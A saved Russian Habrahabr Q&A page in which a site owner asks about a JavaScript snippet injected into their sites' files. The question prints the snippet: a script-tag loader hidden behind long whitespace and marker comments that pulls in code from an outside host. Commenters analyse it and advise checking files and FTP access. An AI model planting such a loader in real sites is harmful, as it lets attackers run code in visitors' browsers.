@@ -1,0 +1,1398 @@
+
+
+<!DOCTYPE html>
+   
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru">
+	<head>
+		<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+		
+		<meta name = "viewport" content = "width = 1080">
+		
+		<title>Внедрили странный кусок кода / Q&amp;A / Хабрахабр</title>
+				
+		
+		
+		
+
+			<link href="/styles/1375881678/all.css" rel="stylesheet" media="all" />
+
+
+		  <link href="/styles/1375881678/_parts/posts.css" rel="stylesheet" media="all" />
+  <link href="/styles/1375881678/forms.css" rel="stylesheet" media="all" />
+  <link href="/styles/1375881678/highlight.css" rel="stylesheet" media="all" />
+  <link href="/styles/1375881678/qa/all.css" rel="stylesheet" media="all" />
+  <link href="/styles/1375881678/qa/view.css" rel="stylesheet" media="all" />
+  <link href="/styles/1375881678/qa/answers.css" rel="stylesheet" media="all" />
+  
+		<link href="/styles/1375881678/printer.css" rel="stylesheet" media="print" />
+
+	
+
+			<script type="text/javascript" src="/javascripts/1375881678/all.js"></script>
+		
+		
+		
+
+	
+	
+	
+	
+		  <script type="text/javascript" src="/javascripts/1375881678/libs/jquery.form.js"></script>
+  <script type="text/javascript" src="/javascripts/1375881678/libs/jquery.cookie.js"></script>
+  <script type="text/javascript" src="/javascripts/1375881678/libs/wysiwyg.js"></script>
+  <script type="text/javascript" src="/javascripts/1375881678/libs/highlight.js"></script>
+  <script type="text/javascript" src="/javascripts/1375881678/_parts/posts.js"></script>
+  <script type="text/javascript" src="/javascripts/1375881678/qa/all.js"></script>
+  <script type="text/javascript" src="/javascripts/1375881678/qa/view.js"></script>
+  <script type="text/javascript" src="/javascripts/1375881678/posts/all.js"></script>
+
+		
+		<script type="text/javascript" src="/js/1375881678/adriver.core.2.js"></script>
+		
+		<link title="Хабрахабр / Внедрили странный кусок кода / Q&amp;A" type="application/rss+xml" rel="alternate" href="http://habrahabr.ru/rss/qa/44688"/>
+				
+			<script type="text/javascript">
+			var _gaq = window._gaq || [];
+			window.onerror = function(msg, url, line) {
+			    //var preventErrorAlert = true;
+			    //_gaq.push(['_trackEvent', 'JS Error', msg, navigator.userAgent + ' -> ' + url + " : " + line]);
+			    //return preventErrorAlert;
+			};
+			
+			jQuery.error = function (message) {
+			    _gaq.push(['_trackEvent', 'jQuery Error', message, navigator.userAgent]);
+			}
+			</script>
+			 
+	</head>
+
+	<body>
+	  	 <a style="background: #5f677c url(/images/banners/bs3.gif) no-repeat center center;display:block;height:90px;box-shadow:0 1px 2px #ccc;" href="http://ad.adriver.ru/cgi-bin/click.cgi?sid=1&ad=414418&bt=21&bid=2747457&bn=2747457&rnd=691805593"></a>
+
+
+
+		
+		<div id="layout">
+		  <div id="header">
+  <div class="userpanel silver">
+      <a href="http://habrahabr.ru/login/" class="login">войти</a> <a href="http://habrahabr.ru/register/">зарегистрироваться</a>
+  </div>
+  <a class="logo " href="http://habrahabr.ru/" title="На главную страницу"></a>
+  <div class="search">
+    <form id="search_form" name="search" method="get" action="/search/" >
+      <input type="submit" value="" />
+      <input type="text" name="q" x-webkit-speech speech tabindex="1" >
+    </form>
+  </div>
+
+	<div class="main_menu">
+		<a href="http://habrahabr.ru/posts/top/">посты</a><a href="http://habrahabr.ru/qa/" class="active">q&amp;a</a><a href="http://habrahabr.ru/events/coming/">события</a><a href="http://habrahabr.ru/hubs/">хабы</a><a href="http://habrahabr.ru/companies/">компании</a>
+		<div class="banner_special">
+
+	
+		<!--  AdRiver code START. Type:135x35 Site: habrahabr PZ: 0 BN: 0 -->
+		<script language="javascript" type="text/javascript"><!--
+		var RndNum4NoCash = Math.round(Math.random() * 1000000000);
+		var ar_Tail='unknown'; if (document.referrer) ar_Tail = escape(document.referrer);
+		document.write(
+		'<iframe src="http://ad.adriver.ru/cgi-bin/erle.cgi?'
+		+ 'sid=176776&target=top&w=135&h=35&bt=25&pz=0&rnd=' + RndNum4NoCash + '&tail256=' + ar_Tail
+		+ '" frameborder=0 vspace=0 hspace=0 width=135 height=35 marginwidth=0'
+		+ ' marginheight=0 scrolling=no></iframe>');
+		//--></script>
+		<noscript>
+		<a href="http://ad.adriver.ru/cgi-bin/click.cgi?sid=176776&bt=25&pz=0&rnd=795668059" target=_top>
+		<img src="http://ad.adriver.ru/cgi-bin/rle.cgi?sid=176776&bt=25&pz=0&rnd=795668059" alt="-AdRiver-" border=0 width=135 height=35></a>
+		</noscript>
+
+		<!--  AdRiver code END  -->
+
+</div>
+		
+	</div>
+
+</div>
+
+
+
+		  
+		  	
+<div class="content_left">
+	
+	
+
+
+
+
+<table class="menu">
+  <tr>
+      <td class="item ">
+        	<a href="http://habrahabr.ru/qa/" ><span class="name">Входящие</span></a>
+      </td>
+      <td class="item ">
+        	<a href="http://habrahabr.ru/qa/hot/" ><span class="name">Горячие</span></a>
+      </td>
+      <td class="item ">
+        	<a href="http://habrahabr.ru/qa/unanswered/" ><span class="name">Без ответа</span></a>
+      </td>
+  </tr>
+</table>
+<div class="submenu ">
+</div>
+<div class="clear"></div>
+
+
+	
+	<div class="qa_view">
+
+				
+	<div class="post shortcuts_item" id="post_44688">
+  	<div class="published"> 6 августа в 18:11</div>	
+		<h1 class="title">
+		
+			
+		
+		
+				<span class="post_title">Внедрили странный кусок кода</span>
+			
+		
+			
+		</h1>
+
+		<div class="hubs">
+		<a href="http://habrahabr.ru/hub/webdev/qa/" class="hub " title="Вы не подписаны на этот хаб" >Веб-разработка</a><span class="profiled_hub" title="Профильный хаб">*</span>, 
+		<a href="http://habrahabr.ru/hub/infosecurity/qa/" class="hub " title="Вы не подписаны на этот хаб" >Информационная безопасность</a><span class="profiled_hub" title="Профильный хаб">*</span>
+</div>
+
+
+	<div class="content html_format">
+	Вот такой кусок кода был внедрен пару дней назад в моих два сайта, в основном в файлы js<br/>
+<br/>
+<code>/*b44d55*/
+                                                                                                                                                                                                                                                          function srcc() {
+ var ff = document.createElement('script');
+ ff.src = 'http://mail.ru';
+ if (!document.getElementById('ff')) {
+ document.write('&lt;div id=\'ff\'&gt;&lt;/div&gt;');
+ document.getElementById('ff').appendChild(ff);
+ }
+}
+srcc();
+/*/b44d55*/</code><br/>
+<br/>
+конечно я сменил пароли на ftp и mysql, может кто-то сталкивался? <br/>
+Первый раз вижу такое чтобы на сайте в коде появились куски чужеродного кода
+			<div class="clear"></div>
+	</div>
+
+			<ul class="tags">
+	<li ><a href="http://habrahabr.ru/search/?q=%5B%D0%B1%D0%B5%D0%B7%D0%BE%D0%BF%D0%B0%D1%81%D0%BD%D0%BE%D1%81%D1%82%D1%8C%20%D1%81%D0%B0%D0%B9%D1%82%D0%BE%D0%B2%5D&target_type=qa" rel="tag">безопасность сайтов</a></li>
+</ul>
+
+			<div class="infopanel_wrapper">
+	<div class="infopanel " id="infopanel_post_44688">
+	
+				<div class="voting   ">
+	
+						<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+	
+					<div class="mark">
+								<span class="score" title="Результат голосования виден только авторизованным пользователям">&#8212;</span>
+					</div>
+					
+						<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+		
+				</div>
+	
+		<div class="pageviews" title="Просмотры вопроса">1944</div>
+			
+		<div class="favorite">
+				<a class="guest"	href="#" onclick="return false;" title="Только зарегистрированные пользователи могут добавлять посты в избранное"></a>
+		</div>
+		<div class="favs_count" title="Количество пользователей, добавивших пост в избранное">3</div>
+		
+		
+		
+	
+	
+	
+	
+				<div class="author">
+					<a title="Автор текста" href="http://habrahabr.ru/users/monoteos/" >monoteos</a>
+					<span class="rating" title="рейтинг пользователя">6,6</span>
+				</div>
+		
+	
+	
+		
+			<div class="share">
+				<div class="twitter">
+					<a href="http://twitter.com/intent/tweet?text=%D0%92%D0%BD%D0%B5%D0%B4%D1%80%D0%B8%D0%BB%D0%B8+%D1%81%D1%82%D1%80%D0%B0%D0%BD%D0%BD%D1%8B%D0%B9+%D0%BA%D1%83%D1%81%D0%BE%D0%BA+%D0%BA%D0%BE%D0%B4%D0%B0+%23habr+http://habr.ru/qa/44688/" title="Опубликовать ссылку в Twitter" target="_blank"></a>
+				</div>
+				<div class="vkontakte">
+					<a href="http://vk.com/share.php?url=" title="Опубликовать ссылку во ВКонтакте" onclick="window.open(this.href, 'Опубликовать ссылку во Вконтакте', 'width=800,height=300'); return false"></a>
+				</div>
+				<div class="facebook">
+					<a href="https://www.facebook.com/sharer/sharer.php?u=" title="Опубликовать ссылку в Facebook" onclick="window.open(this.href, 'Опубликовать ссылку в Facebook', 'width=640,height=436,toolbar=0,status=0'); return false"></a>
+				</div>
+				<div class="googleplus">
+					<a href="https://plus.google.com/share?url=" title="Опубликовать ссылку в Google Plus" onclick="window.open(this.href, 'Опубликовать ссылку в Google Plus', 'width=800,height=300'); return false"></a>
+				</div>
+			</div>
+	
+	</div>
+	<div class="clear"></div>
+</div>
+
+
+
+
+
+			
+		</div>
+	
+
+			
+			<div class="clarification" >
+	<div class="comments" id="clarifications">
+	</div>
+
+	<div class="clarification_form_placeholder"></div>
+</div>
+			<div class="answers" >
+
+	<h2 class="title">
+		<div class="sort">
+			сортировка
+			<span class="date selected" data-type="date">по дате</span>
+			<span class="score" data-type="score">по рейтингу</span>
+		</div>
+		
+		ответы (<span id="comments_count">4</span>)
+		
+		
+	</h2>
+	
+	<div id="answers">
+			<div class="answer" id="answer_168382" data-id="168382" data-score="1" data-date="1375798880">
+	<div class="info  	" rel="168382">
+		<div id="voting_168382" class="voting   ">
+
+				<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+		    <span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+			<div class="mark positive ">
+					<span class="score" title="Всего 3: &uarr;2 и &darr;1">+1</span> 
+			</div>	 
+		</div>
+		<a href="http://habrahabr.ru/users/eleventyseven/" class="avatar"><img src="http://media.habrahabr.ru/images/thumbs/avatars/81/12/2e/20665/small_20665.jpg" alt="" /></a>
+		<a href="http://habrahabr.ru/users/eleventyseven/" class="username">eleventyseven</a><span class="comma">,</span>
+		
+		<time datetime="2013-08-06T18:21:20+04:00"> 6 августа в 18:21 </time>
+		<a href="#answer_168382" class="link_to_comment">#</a>
+		
+
+		
+
+		<div class="accept_link ">
+			<span class="accept">
+					
+			</span>
+			<span class="reject">
+				<span class="label">решение</span>
+					
+			</span>
+		</div>
+			
+		
+
+		<div class="clear"></div>
+	</div>
+	<div class="message html_format ">
+		Год назад работал в компании по созданию сайтов, также занимались хостингом. Как-то утром обнаружили, что порядка 100 сайтов заражены. Именно данной чертовщиной. Проверяйте все js, php, html файлы. Залезли через ftp 
+	</div>
+	<div class="edit_form_placeholder"></div>
+	<div class="comments" id="answer_comments_168382">
+			
+<div class="comment_item" id="comment_212160">
+	<div class="comment_head">
+		<span class="info"><a href="http://habrahabr.ru/users/eleventyseven/">eleventyseven</a>,</span>
+		<span class="time">вчера в 08:13</span>
+		<a href="#comment_212160" class="permalink">#</a>
+		
+			
+		
+	</div>
+	<span class="text html_format">В общем, поясню что делает данная штука. В какой-то момент, открывая сайт, загружается не главная страница, а страница с какими-то баннерами. В нашем случае это были флэш банеры с какими-то электронными рулетками.</span>
+	
+
+
+</div>
+<div class="edit_comment_form_placeholder edit_comment_form_placeholder_212160"></div>
+	</div>
+	<div class="reply">
+	</div>
+	<div class="reply_form_placeholder"></div>
+</div>
+
+			<div class="answer" id="answer_168384" data-id="168384" data-score="6" data-date="1375799023">
+	<div class="info  	" rel="168384">
+		<div id="voting_168384" class="voting   ">
+
+				<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+		    <span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+			<div class="mark positive ">
+					<span class="score" title="Всего 8: &uarr;7 и &darr;1">+6</span> 
+			</div>	 
+		</div>
+		<a href="http://habrahabr.ru/users/Anonym/" class="avatar"><img src="http://media.habrahabr.ru/images/thumbs/avatars/e6/63/3e/20998/small_20998.jpg" alt="" /></a>
+		<a href="http://habrahabr.ru/users/Anonym/" class="username">Anonym</a><span class="comma">,</span>
+		
+		<time datetime="2013-08-06T18:23:43+04:00"> 6 августа в 18:23 </time>
+		<a href="#answer_168384" class="link_to_comment">#</a>
+		
+
+		
+
+		<div class="accept_link ">
+			<span class="accept">
+					
+			</span>
+			<span class="reject">
+				<span class="label">решение</span>
+					
+			</span>
+		</div>
+			
+		
+
+		<div class="clear"></div>
+	</div>
+	<div class="message html_format ">
+		Что делает код:<br/>
+<ol>
+<li>Создается скрипт с src=http://mail.ru<br/>
+<pre><code class="javascript">var ff = document.createElement('script'); ff.src = 'http://mail.ru';
+</code></pre><br/>
+</li>
+<li>Добавляется div<br/>
+<pre><code class="javascript">document.write('&lt;div id=\'ff\'&gt;&lt;/div&gt;'); 
+</code></pre><br/>
+</li>
+<li>В div добавляется скрипт<br/>
+<pre><code class="javascript">document.getElementById('ff').appendChild(ff);
+</code></pre><br/>
+</li>
+</ol><br/>
+Так как нет никакого смысла добавлять скрипт с mail.ru, то предполагаю, что в hosts вам тоже добавили левые адреса, чтобы mail.ru отдавал нужный скрипт. 
+	</div>
+	<div class="edit_form_placeholder"></div>
+	<div class="comments" id="answer_comments_168384">
+			
+<div class="comment_item" id="comment_212022">
+	<div class="comment_head">
+		<span class="info"><a href="http://habrahabr.ru/users/rakot/">rakot</a>,</span>
+		<span class="time"> 6 августа в 18:46</span>
+		<a href="#comment_212022" class="permalink">#</a>
+		
+			
+		
+	</div>
+	<span class="text html_format">Сижу и думаю, чего это вы написали. Получается, что к сайту на каком хостинге получили доступ на уровне файлов, заинжектили js который тянет в общем случае html с сайта мейл ру, а если на клиентской машине другой вирус подменил hosts(причем так что мейл.ру просто не работает, т.к. на главной висит jsка), то все срабатывает как надо?<br/>
+<br/>
+Более вероятно что автор вопроса просто затер «вредоносный» урл или это просто тестовая заглушка, которую еще не придумали как монетизировать.</span>
+	
+
+
+</div>
+<div class="edit_comment_form_placeholder edit_comment_form_placeholder_212022"></div>
+			
+<div class="comment_item" id="comment_212032">
+	<div class="comment_head">
+		<span class="info"><a href="http://habrahabr.ru/users/merlin-vrn/">merlin-vrn</a>,</span>
+		<span class="time"> 6 августа в 18:59</span>
+		<a href="#comment_212032" class="permalink">#</a>
+		
+			
+		
+	</div>
+	<span class="text html_format">как вариант — ddos mail.ru посредством браузеров клиентов заращённых сайтов<br/>
+<br/>
+насчёт «мейлру просто не работает» — ну так на главной может быть логика, чтоб определить, как именно клиент попал на сайт — по вот такой хрени из джаваскрипта или же адрес в строке вбил</span>
+	
+
+
+</div>
+<div class="edit_comment_form_placeholder edit_comment_form_placeholder_212032"></div>
+			
+<div class="comment_item" id="comment_212034">
+	<div class="comment_head">
+		<span class="info"><a href="http://habrahabr.ru/users/Anonym/">Anonym</a>,</span>
+		<span class="time"> 6 августа в 19:01</span>
+		<a href="#comment_212034" class="permalink">#</a>
+		
+			
+		
+	</div>
+	<span class="text html_format">Да, про hosts это я прогнал по полной. Заработался, извините.</span>
+	
+
+
+</div>
+<div class="edit_comment_form_placeholder edit_comment_form_placeholder_212034"></div>
+			
+<div class="comment_item" id="comment_212042">
+	<div class="comment_head">
+		<span class="info"><a href="http://habrahabr.ru/users/monoteos/">monoteos</a>,</span>
+		<span class="time"> 6 августа в 19:53 <span class="changed">(комментарий был изменён)</span> </span>
+		<a href="#comment_212042" class="permalink">#</a>
+		
+			
+		
+	</div>
+	<span class="text html_format">вредоносный код не вытирал, скопировал все как есть. Конечно очевидно что скрипт ничего плохого не делает, вопрос зачем?</span>
+	
+
+
+</div>
+<div class="edit_comment_form_placeholder edit_comment_form_placeholder_212042"></div>
+			
+<div class="comment_item" id="comment_212062">
+	<div class="comment_head">
+		<span class="info"><a href="http://habrahabr.ru/users/stalkerxxl/">stalkerxxl</a>,</span>
+		<span class="time"> 6 августа в 21:34</span>
+		<a href="#comment_212062" class="permalink">#</a>
+		
+			
+		
+	</div>
+	<span class="text html_format">Это «пока» ничего плохого не делает… Подозреваю, что потом будет или страницу подменять, или тулбар mail.ru ставить… Прибыльная эта тема сейчас… в Рунете… =)))</span>
+	
+
+
+</div>
+<div class="edit_comment_form_placeholder edit_comment_form_placeholder_212062"></div>
+			
+<div class="comment_item" id="comment_212076">
+	<div class="comment_head">
+		<span class="info"><a href="http://habrahabr.ru/users/mgrach/">mgrach</a>,</span>
+		<span class="time"> 6 августа в 22:17</span>
+		<a href="#comment_212076" class="permalink">#</a>
+		
+			
+		
+	</div>
+	<span class="text html_format"><a href="http://habrahabr.ru/users/monoteos/" class="user_link">monoteos</a> Может это сам mail.ru себе счетчики накручивает?</span>
+	
+
+
+</div>
+<div class="edit_comment_form_placeholder edit_comment_form_placeholder_212076"></div>
+			
+<div class="comment_item" id="comment_212128">
+	<div class="comment_head">
+		<span class="info"><a href="http://habrahabr.ru/users/monoteos/">monoteos</a>,</span>
+		<span class="time">вчера в 01:55</span>
+		<a href="#comment_212128" class="permalink">#</a>
+		
+			
+		
+	</div>
+	<span class="text html_format">ребята, может это mail.ru-metrika?</span>
+	
+
+
+</div>
+<div class="edit_comment_form_placeholder edit_comment_form_placeholder_212128"></div>
+	</div>
+	<div class="reply">
+	</div>
+	<div class="reply_form_placeholder"></div>
+</div>
+
+			<div class="answer" id="answer_168428" data-id="168428" data-score="-1" data-date="1375815377">
+	<div class="info  	" rel="168428">
+		<div id="voting_168428" class="voting   ">
+
+				<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+		    <span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+			<div class="mark  negative">
+					<span class="score" title="Всего 1: &uarr;0 и &darr;1">–1</span> 
+			</div>	 
+		</div>
+		<a href="http://habrahabr.ru/users/rakot/" class="avatar"><img src="http://media.habrahabr.ru/images/thumbs/avatars/7c/c3/3b/15465/small_15465.jpg" alt="" /></a>
+		<a href="http://habrahabr.ru/users/rakot/" class="username">rakot</a><span class="comma">,</span>
+		
+		<time datetime="2013-08-06T22:56:17+04:00"> 6 августа в 22:56 </time>
+		<a href="#answer_168428" class="link_to_comment">#</a>
+		
+
+		
+
+		<div class="accept_link ">
+			<span class="accept">
+					
+			</span>
+			<span class="reject">
+				<span class="label">решение</span>
+					
+			</span>
+		</div>
+			
+		
+
+		<div class="clear"></div>
+	</div>
+	<div class="message html_format ">
+		Ага ты им счетчики накручиваешь, а они тебе сертификат мейлвари подписать. 
+	</div>
+	<div class="edit_form_placeholder"></div>
+	<div class="comments" id="answer_comments_168428">
+			
+<div class="comment_item" id="comment_212084">
+	<div class="comment_head">
+		<span class="info"><a href="http://habrahabr.ru/users/rakot/">rakot</a>,</span>
+		<span class="time"> 6 августа в 22:57</span>
+		<a href="#comment_212084" class="permalink">#</a>
+		
+			
+		
+	</div>
+	<span class="text html_format">промазал, хотел к предыдущему ответу комент</span>
+	
+
+
+</div>
+<div class="edit_comment_form_placeholder edit_comment_form_placeholder_212084"></div>
+	</div>
+	<div class="reply">
+	</div>
+	<div class="reply_form_placeholder"></div>
+</div>
+
+			<div class="answer" id="answer_168474" data-id="168474" data-score="0" data-date="1375846681">
+	<div class="info  	" rel="168474">
+		<div id="voting_168474" class="voting   ">
+
+				<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+		    <span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+			<div class="mark  ">
+					<span class="score" title="Всего 0: &uarr;0 и &darr;0">0</span> 
+			</div>	 
+		</div>
+		<a href="http://habrahabr.ru/users/lubezniy/" class="avatar"><img src="http://habrahabr.ru/i/avatars/stub-user-small.gif" alt="" /></a>
+		<a href="http://habrahabr.ru/users/lubezniy/" class="username">lubezniy</a><span class="comma">,</span>
+		
+		<time datetime="2013-08-07T07:38:01+04:00">вчера в 07:38 </time>
+		<a href="#answer_168474" class="link_to_comment">#</a>
+		
+
+		
+
+		<div class="accept_link ">
+			<span class="accept">
+					
+			</span>
+			<span class="reject">
+				<span class="label">решение</span>
+					
+			</span>
+		</div>
+			
+		
+
+		<div class="clear"></div>
+	</div>
+	<div class="message html_format ">
+		Думаю, кто-то из начинающих взломщиков тестил, а потом банально урл поменять забыл.<br/>
+А в самом факте внедрения кода в файлы, увы, ничего удивительного нет. Следите постоянно за контентом и скриптами. 
+	</div>
+	<div class="edit_form_placeholder"></div>
+	<div class="comments" id="answer_comments_168474">
+	</div>
+	<div class="reply">
+	</div>
+	<div class="reply_form_placeholder"></div>
+</div>
+
+	</div>
+	
+	
+	  <p class="for_users_only_msg">Только зарегистрированные пользователи могут оставлять комментарии. <a href="http://habrahabr.ru/login/">Войдите</a>, пожалуйста.</p>
+
+	
+	
+</div>
+			
+<form action="#" method="post" class="clarify_form hidden" id="clarify_form">
+	<div class="preview_placeholder hidden html_format"></div>
+
+	<input type="hidden" name="question_id" value="44688" />
+	<input type="hidden" name="answer_id" value="0" />
+	<input type="hidden" name="comment_id" value="0" />
+	<div class="editor">
+		  <div class="panel">
+			  <div class="wysiwyg_wrapper">
+	<div class="can_use_html"><a href="#html_help" onclick="$(this).parents('.wysiwyg_wrapper').find('.help_holder').toggleClass('hidden');return false;">html-теги</a></div>
+		<a title="Жирный" onclick="return habraWYG.insertTagWithText(this, 'b');" href="#" tabindex="-1"><img width="20" height="20" alt="Ж" src="/i/panel/bold_ru.gif"/></a>
+		<a title="Курсив" onclick="return habraWYG.insertTagWithText(this, 'i');" href="#" tabindex="-1"><img width="20" height="20" alt="К" src="/i/panel/italic_ru.gif"/></a>
+		<a title="Подчёркнутый" onclick="return habraWYG.insertTagWithText(this, 'u');" href="#" tabindex="-1"><img width="20" height="20" alt="__" src="/i/panel/underline_ru.gif"/></a>
+		<a title="Зачёркнутый" onclick="return habraWYG.insertTagWithText(this, 's');" href="#" tabindex="-1"><img width="20" height="20" alt="—" src="/i/panel/strikethrough.gif"/></a>
+		<a title="Цитата" style="margin-right: 10px;" onclick="return habraWYG.insertTagWithText(this, 'blockquote');" href="#" tabindex="-1"><img width="20" height="20" alt="Цитата" src="/i/panel/blockquote.png"/></a>
+		<select class="with-title" title="Используйте этот тег для блочных элементов" name="source" onchange="habraWYG.insertSource(this);" tabindex="-1">
+			<option value="" class="title">Source:</option>
+			<option value="bash">Bash</option>
+			<option value="cs">C#</option>
+			<option value="cpp">C++</option>
+			<option value="css">CSS</option>
+			<option value="diff">Diff</option>
+			<option value="html">HTML</option>
+			<option value="xml">XML</option>
+			<option value="java">Java</option>
+			<option value="javascript">JavaScript</option>
+			<option value="php">PHP</option>
+			<option value="perl">Perl</option>
+			<option value="python">Python</option>
+			<option value="ruby">Ruby</option>
+			<option value="sql">SQL</option>
+			<option value="1c">1C</option>
+			<option value="actionscript">ActionScript</option>
+			<option value="apache">Apache</option>
+			<option value="axapta">Axapta</option>
+			<option value="cmake">CMake</option>
+			<option value="coffeescript">CoffeeScript</option>
+			<option value="dos">DOS</option>
+			<option value="delphi">Delphi</option>
+			<option value="django">Django</option>
+			<option value="erlang">Erlang</option>
+			<option value="erlang_repl">Erlang REPL</option>
+			<option value="go">Go</option>
+			<option value="haskell">Haskell</option>
+			<option value="lisp">Lisp</option>
+			<option value="lua">Lua</option>
+			<option value="mel">MEL</option>
+			<option value="markdown">Markdown</option>
+			<option value="matlab">Matlab</option>
+			<option value="nginx">Nginx</option>
+			<option value="objectivec">Objective C</option>
+			<option value="rust">Rust</option>
+			<option value="scala">Scala</option>
+			<option value="smalltalk">Smalltalk</option>
+			<option value="tex">TeX</option>
+			<option value="vbscript">VBScript</option>
+			<option value="vhdl">VHDL</option>
+			<option value="vala">Vala</option>
+		</select>
+		<a style="margin: auto 10px;" title="Код - Используйте этот тег для строчных элементов" onclick="return habraWYG.insertTagWithText(this, 'code');" href="#" tabindex="-1" class="txt"><img width="30" height="20" alt="Код" src="/i/panel/code.gif"/></a>
+		<a title="Вставить ссылку" onclick="return habraWYG.insertLink(this);" href="#" tabindex="-1"><img width="20" height="20" alt="A" src="/i/panel/link.gif"/></a>
+		<a title="Вставить изображение" onclick="return habraWYG.insertImage(this);" href="#" tabindex="-1"><img width="20" height="20" alt="IMG" src="/i/panel/image.gif"/></a>
+		<div class="help_holder hidden">
+          <h4>Теги Хабрахабра</h4>
+					<dl class="block_semi">
+						<dt>&lt;habracut&gt;</dt>
+						<dd class="description">Используется только в текстах постов, скрывает под кат часть текста, следующую за тегом (будет написано «Читать дальше»).</dd>
+					</dl>
+					<dl class="block_semi">
+	
+						<dt>&lt;habracut text=&quot;Подробности&quot; /&gt;</dt>
+						<dd class="description">Так можно превратить надпись «Читать дальше» в любой текст.</dd>
+					</dl>
+					<dl class="block_semi">
+						<dt>&lt;source lang="Язык"&gt;&lt;/source&gt;</dt>
+						<dd class="description">Подсвечивает исходный код (на выбор: 
+						Bash,  C#,  C++,  CSS,  Diff,  HTML, XML,  Ini,  Java,  JavaScript,  PHP,  Perl,  Python,  Ruby,  SQL,
+						1C,  AVR Assembler,  ActionScript,  Apache,  Axapta,  CMake,  CoffeeScript,  DOS, .bat,  Delphi,  Django,  Erlang,  Erlang REPL,  Go,  Haskell,  Lisp,  Lua,  MEL,  Markdown,  Matlab,  Nginx,  Objective C,  Parser3,  Python profile,  RenderMan,  Rust,  Scala,  Smalltalk,  TeX,  VBScript,  VHDL,  Vala    
+						).</dd>
+					</dl>
+					<dl class="block_semi">
+						<dt>&lt;video&gt;http://...&lt;/video&gt;</dt>
+	
+						<dd class="description">Добавляет в пост видео со следующих хостингов: YouTube, RuTube, Google video, Vimeo, Я.Видео и Видео@Mail.ru<br/>Вставляйте между тегами только прямую ссылку на видеоролик.</dd>
+					</dl>
+
+					<dl class="block_semi">
+						<dt>&lt;slideshow&gt;http://...&lt;/slideshow&gt;</dt>						
+	
+						<dd class="description">Вставка интерактивного слайд-шоу. Пока поддерживается только сервис Slideshare.net.</dd>
+					</dl>
+
+					<dl class="block_semi">
+						<dt>&lt;hh user=&quot;Ник&quot; /&gt;</dt>
+	
+						<dd class="description">Выводит имя хабрапользователя посреди текста, обратный слеш (/) в конце тега обязателен. Вы так же можете использовать конструкцию <b>@username</b>, где <b>username</b> &mdash; это ник пользователя.  </dd>
+					</dl>
+					
+					<dl class="block_semi">
+						<dt>&lt;spoiler title=&quot;Заголовок&quot;&gt;Содержимое&lt;/spoiler&gt;</dt>
+	
+						<dd class="description">Вставка спойлера (разворачиваемый блок информации).</dd>
+					</dl>
+					
+					
+					
+					
+					<h4>Стандартные</h4>
+					<table class="wide">
+						<tr>
+							<td>
+		
+								<dl class="block_semi">
+									<dt>&lt;h1&gt;&lt;/h1&gt;<br/>
+										...<br/>
+										&lt;h6&gt;&lt;/h6&gt;
+									</dt>
+									<dd class="description">Заголовки разного уровня.</dd>
+								</dl>
+								<dl class="block_semi">
+	
+									<dt>&lt;img src=&quot;&quot; /&gt;</dt>
+									<dd class="description">Вставка изображения, в атрибуте src нужно указывать полный путь к изображению. Возможно выравнивание картинки атрибутом align.</dd>
+								</dl>
+								<dl class="block_semi">
+									<dt>&lt;a href=&quot;http://...&quot;&gt;Ссылка&lt;/a&gt;</dt>
+	
+									<dd class="description">Вставка ссылки, в атрибуте href указывается желаемый интернет-адрес или якорь (anchor) для навигации по странице.</dd>
+								</dl>								
+								<dl class="block_semi">
+									<dt>&lt;anchor&gt;Example1&lt;/anchor&gt;</dt>
+	
+									<dd class="description">Тег для указания якоря. Для вызова используйте тег вставки ссылок (&lt;a href="#Example1"&gt;Текст&lt;/a&gt;).</dd>
+								</dl>								
+								<dl class="block_semi">
+									<dt>&lt;b&gt;&lt;/b&gt;<br/>
+										&lt;strong&gt;&lt;/strong&gt;</dt>
+									<dd class="description">Выделение важного текста, на странице выделяется жирным начертанием.</dd>
+								</dl>
+								<dl class="block_semi">
+	
+									<dt>&lt;i&gt;&lt;/i&gt;<br/>
+										&lt;em&gt;&lt;/em&gt;</dt>
+									<dd class="description">Выделение важного текста, на странице выделяется курсивом.</dd>
+								</dl>
+								<dl class="block_semi">
+									<dt>
+										&lt;s&gt;&lt;/s&gt;<br/>
+										&lt;strike&gt;&lt;/strike&gt;
+									</dt>
+									<dd class="description">Текст между этими тегами будет отображаться как зачеркнутый.</dd>
+								</dl>
+	
+								<dl class="block_semi">
+									<dt>
+										&lt;u&gt;&lt;/u&gt;
+									</dt>
+									<dd class="description">Текст между этими тегами будет отображаться как подчеркнутый.</dd>
+								</dl>
+	
+								
+							</td>
+							
+							<td width="5%"></td>
+							
+							<td>
+							<dl class="block_semi">
+								<dt>
+									&lt;hr /&gt;
+								</dt>
+								<dd class="description">Тег для вставки горизонтальной линии.</dd>
+							</dl>	
+								<dl class="block_semi">
+									<dt>
+										&lt;blockquote&gt;&lt;/blockquote&gt;
+									</dt>
+									<dd class="description">Используйте этот тег для выделения цитат.</dd>
+	
+								</dl>
+								<dl class="block_semi">
+									<dt>
+										&lt;table&gt;&lt;/table&gt;<br/>
+										&lt;th&gt;&lt;/th&gt;<br/>
+										&lt;td&gt;&lt;/td&gt;<br/>
+	
+										&lt;tr&gt;&lt;/tr&gt;
+									</dt>
+									<dd class="description">Набор тегов для создания таблицы. Тег &lt;td&gt; обозначает ячейку таблицы, тег &lt;th&gt; - ячейку в заголовке, &lt;tr&gt; - строчку таблицы. Все содержимое таблицы помещайте в тег &lt;table&gt;.</dd>
+	
+								</dl>
+								<dl class="block_semi">
+									<dt>
+										&lt;sup&gt;&lt;/sup&gt;<br/>
+										&lt;sub&gt;&lt;/sub&gt;
+									</dt>
+									<dd class="description">Текст, заключенный в тег &lt;sup&gt; отображается в виде верхнего индекса, &lt;sub&gt; - в виде нижнего.</dd>
+	
+								</dl>
+								<dl class="block_semi">
+									<dt>
+										&lt;abbr title=&quot;&quot; &gt;&lt;/abbr&gt;<br/>
